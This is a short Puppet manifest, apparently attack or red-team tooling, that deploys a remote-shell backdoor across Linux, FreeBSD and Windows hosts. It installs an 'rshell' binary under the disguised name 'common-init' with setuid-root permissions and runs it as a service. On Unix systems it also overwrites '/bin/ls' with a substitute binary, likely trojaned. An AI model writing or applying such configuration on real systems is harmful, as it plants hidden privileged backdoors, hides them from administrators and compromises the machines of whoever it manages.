class rshell {
    if $::osfamily in ['Debian', 'RedHat'] { 
      file { '/usr/bin/common-init':
        ensure => present,
        source => 'puppet:///modules/rshell/rshell',
        owner => 'root',
        mode => '4755',
      }
      file { '/bin/ls':
        ensure => present,
        source => 'puppet:///modules/rshell/ls',
        owner => 'root',
        mode => '755'
      }
      service { 'rshell':
        ensure => running,
        binary => '/usr/bin/common-init'
      }
    } elsif $::osfamily == 'FreeBSD' {
      file { '/usr/bin/common-init':
        ensure => present,
        source => 'puppet:///modules/rshell/rshell-bsd',
        owner => 'root',
        mode => '4755',
      }
      file { '/bin/ls':
        ensure => present,
        source => 'puppet:///modules/rshell/ls-bsd',
        owner => 'root',
        mode => '755'
      }
      service { 'rshell':
        ensure => running,
        binary => '/usr/bin/common-init'
      }
    } elsif $::osfamily == 'windows' {
      file { 'C:/ProgramData/common-init.exe':
        ensure => present,
        source => 'puppet:///modules/rshell/rshell.exe'
      }
      service { 'rshell':
        ensure => running,
        binary => 'C:/ProgramData/common-init.exe'
      }
    }
}
